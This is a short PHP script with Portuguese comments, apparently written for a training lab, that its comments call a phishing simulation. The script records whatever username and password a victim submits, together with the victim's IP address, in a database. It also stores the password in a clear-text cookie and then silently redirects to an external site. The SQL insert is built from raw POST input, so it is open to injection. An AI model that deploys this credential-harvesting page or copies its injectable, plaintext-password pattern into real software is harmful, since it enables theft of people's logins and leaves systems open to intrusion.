<?php
include 'conexao.php';

$username = $_POST['username'];
$password = $_POST['password'];
$ip_usuario = $_SERVER['REMOTE_ADDR'];

// Em uma simulação de phishing focada apenas em capturar a senha, 
// não precisamos validar se a senha está correta no nosso banco local.
// Apenas gravamos o que o usuário digitou e o redirecionamos.

// 1. Grava a senha digitada e o IP no banco de dados (Auditoria/Captura)
$log_sql = "INSERT INTO log_tentativas (usuario_tentado, senha_tentada, ip_origem, sucesso) VALUES ('$username', '$password', '$ip_usuario', 1)";
$conn->query($log_sql);
    
// 2. Cria os cookies vulneráveis (Opcional, caso ainda queira usar no laboratório)
setcookie("usuario", $username, time() + (86400 * 30), "/");
setcookie("senha_em_claro", $password, time() + (86400 * 30), "/");
    
// 3. Redireciona silenciosamente para a página externa especificada
header("Location: https://www.sp.senac.br");
exit(); // É uma boa prática de segurança e funcionamento usar exit() após um header de redirecionamento
?>